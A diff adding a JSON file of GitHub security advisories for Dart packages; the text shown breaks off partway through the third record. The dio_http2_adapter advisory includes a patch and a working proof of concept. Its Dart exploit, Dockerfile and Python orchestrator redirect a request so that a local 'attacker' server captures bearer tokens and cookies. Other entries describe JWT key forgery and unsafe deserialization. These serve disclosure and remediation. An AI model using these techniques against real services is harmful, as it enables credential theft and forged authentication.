@@ -1,0 +1,1598 @@
+[
+  {
+    "ghsa_id": "GHSA-cr65-55v9-xhvv",
+    "cve_id": "CVE-2026-103030",
+    "url": "https://api.github.com/advisories/GHSA-cr65-55v9-xhvv",
+    "html_url": "https://github.com/advisories/GHSA-cr65-55v9-xhvv",
+    "summary": "Dio: Cross-origin redirect leaks sensitive request headers in `dio_http2_adapter`",
+    "description": "### Summary\n\n`dio_http2_adapter` follows HTTP `Location` redirects without stripping sensitive request headers when the redirect target is a different origin. An attacker who can cause any origin server to return a cross-origin `302` redirect receives the victim's `Authorization`, `Cookie`, and `Proxy-Authorization` headers verbatim. This vulnerability has a CVSS v3.1 base score of **7.5 (High)** because `followRedirects` is enabled by default, no authentication is required to exploit it, and the confidentiality impact is high.\n\n### Details\n\nWhen `Dio` is configured to use `Http2Adapter`, the adapter's internal `_fetch` method constructs HTTP/2 request headers by unconditionally copying all entries from `options.headers`:\n\n```dart\n// plugins/http2_adapter/lib/src/http2_adapter.dart:111\nheaders.addAll(\n  options.headers.entries.map((entry) {\n    ...\n    return Header.ascii(entry.key.toLowerCase(), v);\n  }).toList(),\n);\n```\n\nOn receiving a `3xx` response, the adapter reads the `Location` header and resolves the redirect target URI:\n\n```dart\n// plugins/http2_adapter/lib/src/http2_adapter.dart:254-263\nfinal url = responseHeaders.value('location');\nfinal uri = Uri.parse(url ?? '');\nfinal String path = resolveRedirectUri(options.uri, uri).toString();\nreturn _fetch(options.copyWith(path: path, maxRedirects: --options.maxRedirects), ...);\n```\n\n`options.copyWith` is called without an explicit `headers` argument; `dio/lib/src/options.dart:629` therefore preserves the full original header map via `headers ?? Map.from(this.headers)`. `resolveRedirectUri` (`http2_adapter.dart:290`) returns an attacker-controlled cross-origin URI without any origin comparison. The combination means that on every redirect, the full set of original sensitive headers — including `Authorization`, `Cookie`, and `Proxy-Authorization` — is forwarded to the new authority with no sanitization.\n\n**Data flow (source → sink):**\n\n1. `dio/lib/src/dio_mixin.dart:383` — public `Dio.request<T>(String path, ...)` entry point.\n2. `dio/lib/src/options.dart:331` — base and per-request headers merged into `RequestOptions`.\n3. `dio/lib/src/dio_mixin.dart:596` — `httpClientAdapter.fetch(reqOpt, ...)` dispatches to `Http2Adapter`.\n4. `plugins/http2_adapter/lib/src/http2_adapter.dart:254` — `Location` header is read from the network response (attacker-controlled source).\n5. `plugins/http2_adapter/lib/src/http2_adapter.dart:258` — redirect target URI resolved; cross-origin check absent.\n6. `plugins/http2_adapter/lib/src/http2_adapter.dart:260` — `options.copyWith(path: path, ...)` called without `headers` override.\n7. `dio/lib/src/options.dart:629` — `copyWith` preserves `Map.from(this.headers)` — all sensitive headers retained.\n8. `plugins/http2_adapter/lib/src/http2_adapter.dart:111` — preserved headers emitted verbatim to the cross-origin HTTP/2 request (sink).\n\n**Suggested patch** — strip sensitive headers before following a cross-origin redirect:\n\n```diff\n--- a/plugins/http2_adapter/lib/src/http2_adapter.dart\n+++ b/plugins/http2_adapter/lib/src/http2_adapter.dart\n+  static const _sensitiveRedirectHeaders = {\n+    'authorization',\n+    'cookie',\n+    'proxy-authorization',\n+  };\n+\n-      final String path = resolveRedirectUri(options.uri, uri).toString();\n+      final redirectUri = resolveRedirectUri(options.uri, uri);\n+      final redirectOptions = options.copyWith(\n+        path: redirectUri.toString(),\n+        maxRedirects: --options.maxRedirects,\n+      );\n+      if (!_sameOrigin(options.uri, redirectUri)) {\n+        redirectOptions.headers.removeWhere(\n+          (name, _) => _sensitiveRedirectHeaders.contains(name.toLowerCase()),\n+        );\n+      }\n       return _fetch(\n-        options.copyWith(path: path, maxRedirects: --options.maxRedirects),\n+        redirectOptions,\n         list != null ? Stream.fromIterable(list) : null,\n         cancelFuture,\n         redirects,\n       );\n+\n+  static bool _sameOrigin(Uri a, Uri b) =>\n+      a.scheme == b.scheme && a.host == b.host && a.port == b.port;\n```\n\n### PoC\n\nThe following steps reproduce the vulnerability using two local HTTP/2 cleartext (h2c) servers inside an isolated Docker container (no external network required).\n\n**Prerequisites:**\n\n- Docker installed and accessible.\n- Repository checked out at the path used as the build context.\n\n**Build and run:**\n\n```bash\n# From the repository root (github_web_81_cfug__dio/)\ndocker build -f vuln-001/Dockerfile -t dio-vuln-001:poc .\ndocker run --rm --network none dio-vuln-001:poc\n```\n\n**What the container does:**\n\n1. Starts an *origin* h2c server on `127.0.0.1:18081` that immediately returns `302 Location: http://127.0.0.1:18082/capture`.\n2. Starts an *attacker* h2c server on `127.0.0.1:18082` that logs every received header.\n3. Executes the following Dart exploit:\n\n```dart\nfinal dio = Dio()\n  ..httpClientAdapter = Http2Adapter(ConnectionManager());\nawait dio.get(\n  'http://127.0.0.1:18081/start',\n  options: Options(headers: {\n    'Authorization': 'Bearer SECRET_TOKEN_12345',\n    'Cookie': 'sid=SECRET_SESSION_ABC',\n    'x-secret': 'internal-secret-value',\n  }),\n);\n```\n\n**Expected output (confirms vulnerability):**\n\n```\nRESULT=VULN_CONFIRMED\nLEAKED_HEADER=authorization: Bearer SECRET_TOKEN_12345\nLEAKED_COOKIE=sid=SECRET_SESSION_ABC\n\n[ATTACKER] Received headers:\n[ATTACKER]   authorization: Bearer SECRET_TOKEN_12345\n[ATTACKER]   cookie: sid=SECRET_SESSION_ABC\n[ATTACKER]   x-secret: internal-secret-value\n```\n\nThe attacker server at `127.0.0.1:18082` receives all three sensitive headers, demonstrating that `Http2Adapter` forwards them verbatim across the cross-origin redirect with no stripping.\n\n### Impact\n\nThis is a **sensitive information disclosure** vulnerability. Any application that:\n\n1. configures `Dio` with `Http2Adapter`, and\n2. sends requests carrying `Authorization`, `Cookie`, or `Proxy-Authorization` headers,\n\nis affected. Because `followRedirects` defaults to `true` and `maxRedirects` defaults to `5`, no additional configuration is needed to trigger the bug.\n\nAn attacker who controls — or can compromise — any HTTP server that the victim application contacts can issue a `302` redirect to an attacker-owned server and thereby capture the victim's bearer tokens, session cookies, or proxy credentials. The attack requires no prior authentication and is executable over the network with low complexity. Stolen credentials may then be used to impersonate the victim against the original service or any other service that accepts the same token.\n\nAffected parties include server-side Dart/Flutter applications and CLI tools that make authenticated HTTP/2 requests through `dio_http2_adapter`.\n\n### Reproduction artifacts\n\n#### `Dockerfile`\n\n```dockerfile\n# Dockerfile for VULN-001 dynamic reproduction\n# Vulnerability: Cross-origin redirect leaks sensitive request headers in dio_http2_adapter\n#\n# Build context: the parent directory (github_web_81_cfug__dio/)\n#   docker build -f vuln-001/Dockerfile -t dio-vuln-001 .\n#\n# What this image does:\n#   1. Installs Dart SDK (stable)\n#   2. Copies the vulnerable repository source (dio + dio_http2_adapter)\n#   3. Creates a PoC Dart project using path dependencies to the local source\n#   4. Resolves pub packages\n#   5. On container run: executes the exploit script that starts two local\n#      h2c servers (origin + attacker) and makes a redirected request to prove\n#      that Authorization/Cookie headers are forwarded to the cross-origin target\n\nFROM dart:stable AS builder\n\n# ── Repository source ──────────────────────────────────────────────────────────\n# Copy only the packages we need to keep image small\nCOPY repo/dio/ /repo/dio/\nCOPY repo/plugins/http2_adapter/ /repo/plugins/http2_adapter/\n\n# ── PoC project setup ──────────────────────────────────────────────────────────\nWORKDIR /poc\n\nCOPY vuln-001/poc_pubspec.yaml pubspec.yaml\nCOPY vuln-001/poc_exploit.dart lib/main.dart\n\n# Resolve dependencies (requires network access to pub.dev for http2, meta, etc.)\nRUN dart pub get\n\n# ── Runtime image (reuse builder to keep it simple) ────────────────────────────\nFROM builder AS final\n\nWORKDIR /poc\n\n# Run the exploit; exit code:\n#   0 = VULN_CONFIRMED (authorization header leaked to attacker)\n#   1 = NOT_VULNERABLE  (header was stripped or redirect not followed)\n#   2 = FAIL            (attacker server never received a request — env issue)\nCMD [\"dart\", \"run\", \"lib/main.dart\"]\n```\n\n#### `poc.py`\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC orchestrator for VULN-001:\n  Cross-origin redirect leaks sensitive request headers in dio_http2_adapter.\n\nUsage:\n    python3 poc.py [--image-tag TAG]\n\nWhat it does:\n    1. Builds a Docker image containing the vulnerable dio_http2_adapter source\n       and a Dart exploit script (poc_exploit.dart).\n    2. Runs the container, which:\n         a. Starts two local h2c (HTTP/2 cleartext) servers inside the container:\n              - Origin  (127.0.0.1:18081): returns 302 → attacker\n              - Attacker (127.0.0.1:18082): logs all received headers\n         b. Uses dio + Http2Adapter to GET http://origin/start with\n            Authorization and Cookie headers.\n         c. Follows the 302 redirect to the attacker server.\n         d. Reports whether the Authorization header was captured by the attacker.\n    3. Writes phase2_result.json with structured verdict.\n\nExit codes:\n    0  PASS   — vulnerability confirmed\n    1  FAIL   — not reproduced\n    2  ERROR  — build or runtime environment problem\n\"\"\"\n\nimport argparse\nimport json\nimport os\nimport subprocess\nimport sys\nimport textwrap\nfrom pathlib import Path\n\n# ── Paths ──────────────────────────────────────────────────────────────────────\nSCRIPT_DIR = Path(__file__).resolve().parent\nREPO_ROOT = SCRIPT_DIR.parent          # github_web_81_cfug__dio/\nRESULT_FILE = SCRIPT_DIR / \"phase2_result.json\"\n\nBUILD_CONTEXT = str(REPO_ROOT)\nDOCKERFILE = str(SCRIPT_DIR / \"Dockerfile\")\nDEFAULT_IMAGE_TAG = \"dio-vuln-001:poc\"\n\n\ndef run(cmd: list[str], **kwargs) -> subprocess.CompletedProcess:\n    \"\"\"Run a subprocess command, streaming stdout/stderr to the terminal.\"\"\"\n    print(f\"[+] {' '.join(cmd)}\", flush=True)\n    return subprocess.run(cmd, **kwargs)\n\n\ndef build_image(tag: str) -> bool:\n    \"\"\"Build the Docker image. Returns True on success.\"\"\"\n    result = run(\n        [\n            \"docker\", \"build\",\n            \"--file\", DOCKERFILE,\n            \"--tag\", tag,\n            BUILD_CONTEXT,\n        ],\n        check=False,\n    )\n    if result.returncode != 0:\n        print(f\"[!] Docker build failed (exit {result.returncode})\", file=sys.stderr)\n        return False\n    return True\n\n\ndef run_container(tag: str, timeout_sec: int = 120) -> tuple[int, str, str]:\n    \"\"\"\n    Run the container and capture its output.\n\n    Returns:\n        (returncode, stdout, stderr)\n    \"\"\"\n    result = run(\n        [\n            \"docker\", \"run\",\n            \"--rm\",\n            \"--network\", \"none\",   # no external network; loopback only\n            tag,\n        ],\n        capture_output=True,\n        text=True,\n        timeout=timeout_sec,\n        check=False,\n    )\n    return result.returncode, result.stdout, result.stderr\n\n\ndef parse_output(stdout: str, stderr: str) -> dict:\n    \"\"\"\n    Parse structured key=value lines from the exploit's stdout.\n\n    The Dart exploit writes lines like:\n        RESULT=VULN_CONFIRMED\n        LEAKED_HEADER=authorization: Bearer SECRET_TOKEN_12345\n        EVIDENCE=...\n    \"\"\"\n    parsed = {}\n    for line in stdout.splitlines():\n        if \"=\" in line:\n            key, _, val = line.partition(\"=\")\n            parsed[key.strip()] = val.strip()\n    return parsed\n\n\ndef write_result(data: dict) -> None:\n    with open(RESULT_FILE, \"w\", encoding=\"utf-8\") as f:\n        json.dump(data, f, ensure_ascii=False, indent=2)\n    print(f\"\\n[+] Result written to {RESULT_FILE}\")\n\n\ndef main() -> int:\n    parser = argparse.ArgumentParser(description=__doc__)\n    parser.add_argument(\n        \"--image-tag\", default=DEFAULT_IMAGE_TAG,\n        help=f\"Docker image tag (default: {DEFAULT_IMAGE_TAG})\",\n    )\n    args = parser.parse_args()\n    tag = args.image_tag\n\n    build_cmd = (\n        f\"docker build -f vuln-001/Dockerfile -t {tag} .\"\n    )\n    run_cmd = (\n        f\"docker run --rm --network none {tag}\"\n    )\n    poc_cmd = (\n        f\"cd {REPO_ROOT} && {build_cmd} && {run_cmd}\"\n    )\n\n    # ── Step 1: Build ──────────────────────────────────────────────────────────\n    print(\"=\" * 70)\n    print(\"STEP 1: Building Docker image\")\n    print(\"=\" * 70)\n    if not build_image(tag):\n        result_data = {\n            \"passed\": False,\n            \"verdict\": \"FAIL\",\n            \"reason\": \"Docker image build failed — dart pub get or source copy error\",\n            \"build_command\": f\"cd {REPO_ROOT} && {build_cmd}\",\n            \"run_command\": run_cmd,\n            \"poc_command\": poc_cmd,\n            \"evidence\": \"docker build non-zero exit code\",\n            \"artifacts\": [\"Dockerfile\", \"poc_exploit.dart\", \"poc_pubspec.yaml\"],\n        }\n        write_result(result_data)\n        return 2\n\n    # ── Step 2: Run exploit ────────────────────────────────────────────────────\n    print(\"\\n\" + \"=\" * 70)\n    print(\"STEP 2: Running exploit container\")\n    print(\"=\" * 70)\n\n    try:\n        returncode, stdout, stderr = run_container(tag)\n    except subprocess.TimeoutExpired:\n        result_data = {\n            \"passed\": False,\n            \"verdict\": \"INCOMPLETE\",\n            \"reason\": \"Container execution did not complete within 120 seconds and was terminated due to timeout\",\n            \"build_command\": f\"cd {REPO_ROOT} && {build_cmd}\",\n            \"run_command\": run_cmd,\n            \"poc_command\": poc_cmd,\n            \"evidence\": \"subprocess.TimeoutExpired after 120 s\",\n            \"artifacts\": [\"Dockerfile\", \"poc_exploit.dart\", \"poc_pubspec.yaml\"],\n        }\n        write_result(result_data)\n        return 2\n\n    print(\"\\n── Container STDOUT ─────────────────────────────────────────────\")\n    print(stdout or \"(empty)\")\n    print(\"── Container STDERR ─────────────────────────────────────────────\")\n    print(stderr or \"(empty)\")\n    print(\"── Exit code:\", returncode, \"─────────────────────────────────────\")\n\n    # ── Step 3: Evaluate results ───────────────────────────────────────────────\n    parsed = parse_output(stdout, stderr)\n    exploit_result = parsed.get(\"RESULT\", \"\")\n    leaked_header = parsed.get(\"LEAKED_HEADER\", \"\")\n    evidence_line = parsed.get(\"EVIDENCE\", \"\")\n\n    if returncode == 0 and exploit_result == \"VULN_CONFIRMED\" and leaked_header:\n        # Combine stdout + a snippet of stderr for the evidence field\n        stderr_snippet = \"\\n\".join(\n            line for line in stderr.splitlines()\n            if any(tag in line for tag in (\"[ATTACKER]\", \"[RESULT]\", \"[EVIDENCE]\"))\n        )[:1500]\n        evidence = (\n            f\"stdout: {stdout.strip()}\\n\\n\"\n            f\"stderr (relevant):\\n{stderr_snippet}\"\n        )\n        result_data = {\n            \"passed\": True,\n            \"verdict\": \"PASS\",\n            \"reason\": (\n                \"dio_http2_adapter forwarded the original Authorization header verbatim \"\n                \"to the attacker's server without stripping it when following a \"\n                \"cross-origin 302 redirect. The attacker h2c server (127.0.0.1:18082) \"\n                f\"received '{leaked_header}'.\"\n            ),\n            \"build_command\": f\"cd {REPO_ROOT} && {build_cmd}\",\n            \"run_command\": run_cmd,\n            \"poc_command\": poc_cmd,\n            \"evidence\": evidence,\n            \"artifacts\": [\n                \"Dockerfile\",\n                \"poc_exploit.dart\",\n                \"poc_pubspec.yaml\",\n                \"poc.py\",\n            ],\n        }\n        write_result(result_data)\n        print(\"\\n[PASS] VULN-001 reproduced successfully.\")\n        return 0\n\n    elif returncode == 1 or exploit_result == \"NOT_VULNERABLE\":\n        result_data = {\n            \"passed\": False,\n            \"verdict\": \"FAIL\",\n            \"reason\": (\n                \"Container execution succeeded, but the attacker server did not \"\n                \"receive the Authorization header. The vulnerability was not \"\n                f\"reproduced in this environment. Parsed result: {parsed}\"\n            ),\n            \"build_command\": f\"cd {REPO_ROOT} && {build_cmd}\",\n            \"run_command\": run_cmd,\n            \"poc_command\": poc_cmd,\n            \"evidence\": stdout + \"\\n\" + stderr,\n            \"artifacts\": [\"Dockerfile\", \"poc_exploit.dart\", \"poc_pubspec.yaml\"],\n        }\n        write_result(result_data)\n        print(\"\\n[FAIL] Vulnerability not reproduced.\")\n        return 1\n\n    else:\n        # returncode == 2 or other unexpected failure\n        result_data = {\n            \"passed\": False,\n            \"verdict\": \"INCOMPLETE\",\n            \"reason\": (\n                f\"Container execution failed or exited with an unexpected code {returncode}. \"\n                \"Cause: h2c server startup error, network issue, or Dart runtime \"\n                \"error. Check the stderr log and retry without --network none.\"\n            ),\n            \"build_command\": f\"cd {REPO_ROOT} && {build_cmd}\",\n            \"run_command\": run_cmd,\n            \"poc_command\": poc_cmd,\n            \"evidence\": f\"exit={returncode}\\nstdout={stdout}\\nstderr={stderr}\",\n            \"artifacts\": [\"Dockerfile\", \"poc_exploit.dart\", \"poc_pubspec.yaml\"],\n        }\n        write_result(result_data)\n        print(f\"\\n[INCOMPLETE] Container exited with code {returncode}.\")\n        return 2\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n```",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/cfug/dio/security-advisories/GHSA-cr65-55v9-xhvv",
+    "source_code_location": "https://github.com/cfug/dio",
+    "identifiers": [
+      {
+        "value": "GHSA-cr65-55v9-xhvv",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-103030",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/cfug/dio/security/advisories/GHSA-cr65-55v9-xhvv",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-103030",
+      "https://github.com/cfug/dio/commit/9d7ac913340084f3b4987b121e076f28d637a81e",
+      "https://github.com/cfug/dio/releases/tag/http2_adapter_v2.8.0",
+      "https://github.com/advisories/GHSA-cr65-55v9-xhvv"
+    ],
+    "published_at": "2026-10-15T20:18:37Z",
+    "updated_at": "2026-10-15T20:18:38Z",
+    "github_reviewed_at": "2026-10-15T20:18:37Z",
+    "nvd_published_at": "2026-10-13T17:17:14Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pub",
+          "name": "dio_http2_adapter"
+        },
+        "vulnerable_version_range": ">= 1.0.0, <= 2.7.1",
+        "first_patched_version": "2.8.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "score": 7.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-200",
+        "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "EQSTLab",
+          "id": 148991397,
+          "node_id": "U_kgDOCOFtpQ",
+          "avatar_url": "https://avatars.githubusercontent.com/u/148991397?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/EQSTLab",
+          "html_url": "https://github.com/EQSTLab",
+          "followers_url": "https://api.github.com/users/EQSTLab/followers",
+          "following_url": "https://api.github.com/users/EQSTLab/following{/other_user}",
+          "gists_url": "https://api.github.com/users/EQSTLab/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/EQSTLab/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/EQSTLab/subscriptions",
+          "organizations_url": "https://api.github.com/users/EQSTLab/orgs",
+          "repos_url": "https://api.github.com/users/EQSTLab/repos",
+          "events_url": "https://api.github.com/users/EQSTLab/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/EQSTLab/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "useworld",
+          "id": 16302604,
+          "node_id": "MDQ6VXNlcjE2MzAyNjA0",
+          "avatar_url": "https://avatars.githubusercontent.com/u/16302604?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/useworld",
+          "html_url": "https://github.com/useworld",
+          "followers_url": "https://api.github.com/users/useworld/followers",
+          "following_url": "https://api.github.com/users/useworld/following{/other_user}",
+          "gists_url": "https://api.github.com/users/useworld/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/useworld/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/useworld/subscriptions",
+          "organizations_url": "https://api.github.com/users/useworld/orgs",
+          "repos_url": "https://api.github.com/users/useworld/repos",
+          "events_url": "https://api.github.com/users/useworld/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/useworld/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder"
+      }
+    ],
+    "comments": 3,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "score": 7.5
+    },
+    "epss": {
+      "percentage": 0.00359,
+      "percentile": 0.29328
+    }
+  },
+  {
+    "ghsa_id": "GHSA-vm9r-h74p-hg97",
+    "cve_id": "CVE-2026-34240",
+    "url": "https://api.github.com/advisories/GHSA-vm9r-h74p-hg97",
+    "html_url": "https://github.com/advisories/GHSA-vm9r-h74p-hg97",
+    "summary": "jose vulnerable to untrusted JWK header key acceptance during signature verification",
+    "description": "### Impact\n\nA vulnerability in `jose` versions up to and including `0.3.5` could allow an unauthenticated, remote attacker to forge valid JWS/JWT tokens by using a key embedded in the JOSE header (`jwk`).  \n\nThe vulnerability exists because key selection could treat header-provided `jwk` as a verification candidate even when that key was not present in the trusted key store. Since JOSE headers are untrusted input, an attacker could exploit this by creating a token payload, embedding an attacker-controlled public key in the header, and signing with the matching private key.  \n\nApplications using affected versions for token verification are impacted.\n\n### Patches\n\nUpgrade to `0.3.5+1` or later.\n\n### Workarounds\n\nReject tokens where header `jwk` is present unless that `jwk` matches a key already present in the application's trusted key store.\n\n### Resources\n\nFix commit: [fix: improved key resolution in JsonWebKeyStore](https://github.com/appsup-dart/jose/commit/b07799aac1f56a9a21483feac026272aab30cc5d)",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/appsup-dart/jose/security-advisories/GHSA-vm9r-h74p-hg97",
+    "source_code_location": "https://github.com/appsup-dart/jose",
+    "identifiers": [
+      {
+        "value": "GHSA-vm9r-h74p-hg97",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-34240",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/appsup-dart/jose/security/advisories/GHSA-vm9r-h74p-hg97",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-34240",
+      "https://github.com/appsup-dart/jose/commit/b07799aac1f56a9a21483feac026272aab30cc5d",
+      "https://github.com/advisories/GHSA-vm9r-h74p-hg97"
+    ],
+    "published_at": "2026-03-31T23:09:16Z",
+    "updated_at": "2026-04-02T15:45:02Z",
+    "github_reviewed_at": "2026-03-31T23:09:16Z",
+    "nvd_published_at": "2026-03-31T16:16:33Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pub",
+          "name": "jose"
+        },
+        "vulnerable_version_range": "<= 0.3.5",
+        "first_patched_version": "0.3.5+1",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+        "score": 7.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-347",
+        "name": "Improper Verification of Cryptographic Signature"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "splitline",
+          "id": 10939796,
+          "node_id": "MDQ6VXNlcjEwOTM5Nzk2",
+          "avatar_url": "https://avatars.githubusercontent.com/u/10939796?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/splitline",
+          "html_url": "https://github.com/splitline",
+          "followers_url": "https://api.github.com/users/splitline/followers",
+          "following_url": "https://api.github.com/users/splitline/following{/other_user}",
+          "gists_url": "https://api.github.com/users/splitline/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/splitline/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/splitline/subscriptions",
+          "organizations_url": "https://api.github.com/users/splitline/orgs",
+          "repos_url": "https://api.github.com/users/splitline/repos",
+          "events_url": "https://api.github.com/users/splitline/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/splitline/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder"
+      }
+    ],
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+      "score": 7.5
+    },
+    "epss": {
+      "percentage": 0.0013,
+      "percentile": 0.02594
+    }
+  },
+  {
+    "ghsa_id": "GHSA-3hpf-ff72-j67p",
+    "cve_id": null,
+    "url": "https://api.github.com/advisories/GHSA-3hpf-ff72-j67p",
+    "html_url": "https://github.com/advisories/GHSA-3hpf-ff72-j67p",
+    "summary": "shared_preferences_android vulnerability",
+    "description": "### Impact\nDue to some data types not being natively representable for the available storage options, shared_preferences_android serializes and deserializes special string prefixes to store these unrepresentable data types. This allows arbitrary classes to be deserialized leading to arbitrary code execution.\n\nAs a result, Files containing the preferences can be overwritten with a malicious one with a deserialization payload that triggers as soon as the data is loaded from the disk.\n\n### Patches\n2.3.4\n\n### Workarounds\nUpdate to the latest version of shared_preferences_android that contains the changes to address this vulnerability.\n\n### References\nTBD\n\n### For more information\nSee [our community page](https://dart.dev/community) to find ways to contact the team.\n\n### Thanks\nThank you so much to Oskar Zeino-Mahmalat from sonarsource for finding and reporting this issue!",
+    "type": "reviewed",
+    "severity": "low",
+    "repository_advisory_url": "https://api.github.com/repos/flutter/packages/security-advisories/GHSA-3hpf-ff72-j67p",
+    "source_code_location": "https://github.com/flutter/packages",
+    "identifiers": [
+      {
+        "value": "GHSA-3hpf-ff72-j67p",
+        "type": "GHSA"
+      }
+    ],
+    "references": [
+      "https://github.com/flutter/packages/security/advisories/GHSA-3hpf-ff72-j67p",
+      "https://github.com/flutter/packages/commit/15501ece235684a3bdddad089345fc3e33dc1df3",
+      "https://github.com/advisories/GHSA-3hpf-ff72-j67p"
+    ],
+    "published_at": "2024-12-06T21:24:30Z",
+    "updated_at": "2024-12-09T10:40:08Z",
+    "github_reviewed_at": "2024-12-06T21:24:30Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pub",
+          "name": "shared_preferences_android"
+        },
+        "vulnerable_version_range": "= 2.3.3",
+        "first_patched_version": "2.3.4",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:L",
+        "score": 3.0
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-502",
+        "name": "Deserialization of Untrusted Data"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "oskar-zeinomahmalat-sonarsource",
+          "id": 129738379,
+          "node_id": "U_kgDOB7umiw",
+          "avatar_url": "https://avatars.githubusercontent.com/u/129738379?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/oskar-zeinomahmalat-sonarsource",
+          "html_url": "https://github.com/oskar-zeinomahmalat-sonarsource",
+          "followers_url": "https://api.github.com/users/oskar-zeinomahmalat-sonarsource/followers",
+          "following_url": "https://api.github.com/users/oskar-zeinomahmalat-sonarsource/following{/other_user}",
+          "gists_url": "https://api.github.com/users/oskar-zeinomahmalat-sonarsource/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/oskar-zeinomahmalat-sonarsource/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/oskar-zeinomahmalat-sonarsource/subscriptions",
+          "organizations_url": "https://api.github.com/users/oskar-zeinomahmalat-sonarsource/orgs",
+          "repos_url": "https://api.github.com/users/oskar-zeinomahmalat-sonarsource/repos",
+          "events_url": "https://api.github.com/users/oskar-zeinomahmalat-sonarsource/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/oskar-zeinomahmalat-sonarsource/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "reidbaker",
+          "id": 1063596,
+          "node_id": "MDQ6VXNlcjEwNjM1OTY=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/1063596?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/reidbaker",
+          "html_url": "https://github.com/reidbaker",
+          "followers_url": "https://api.github.com/users/reidbaker/followers",
+          "following_url": "https://api.github.com/users/reidbaker/following{/other_user}",
+          "gists_url": "https://api.github.com/users/reidbaker/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/reidbaker/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/reidbaker/subscriptions",
+          "organizations_url": "https://api.github.com/users/reidbaker/orgs",
+          "repos_url": "https://api.github.com/users/reidbaker/repos",
+          "events_url": "https://api.github.com/users/reidbaker/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/reidbaker/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "coordinator"
+      },
+      {
+        "user": {
+          "login": "stuartmorgan-g",
+          "id": 122189,
+          "node_id": "MDQ6VXNlcjEyMjE4OQ==",
+          "avatar_url": "https://avatars.githubusercontent.com/u/122189?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/stuartmorgan-g",
+          "html_url": "https://github.com/stuartmorgan-g",
+          "followers_url": "https://api.github.com/users/stuartmorgan-g/followers",
+          "following_url": "https://api.github.com/users/stuartmorgan-g/following{/other_user}",
+          "gists_url": "https://api.github.com/users/stuartmorgan-g/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/stuartmorgan-g/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/stuartmorgan-g/subscriptions",
+          "organizations_url": "https://api.github.com/users/stuartmorgan-g/orgs",
+          "repos_url": "https://api.github.com/users/stuartmorgan-g/repos",
